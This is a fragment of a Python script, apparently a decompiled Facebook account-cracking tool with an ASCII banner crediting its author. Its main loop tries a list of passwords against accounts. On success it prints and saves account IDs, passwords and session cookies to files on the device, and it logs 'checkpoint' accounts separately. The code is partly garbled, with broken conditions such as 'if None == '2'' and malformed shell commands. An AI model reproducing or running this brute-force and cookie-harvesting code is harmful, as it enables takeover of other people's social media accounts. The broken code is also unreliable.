...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/Itz.Unknown .Brand')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
\033[1;35m        ██   ██  ██ ██  ██   ██ 
\033[1;37m.       ██   ██ ██   ██ ██████                                                                     
\033[1;32m================= \33[32mAXB\33[0;37m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mAZAN ALI
\033[1;32m     \033[1;32mFACEBOK      : \033[1;32m AZAN X.
\033[1;32m     \033[1;33mGITHUB       :  \033[1;31m MR-AZAN
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SUCCESSFUL)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Unknown -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(CHECKPOINT)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Unknown -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
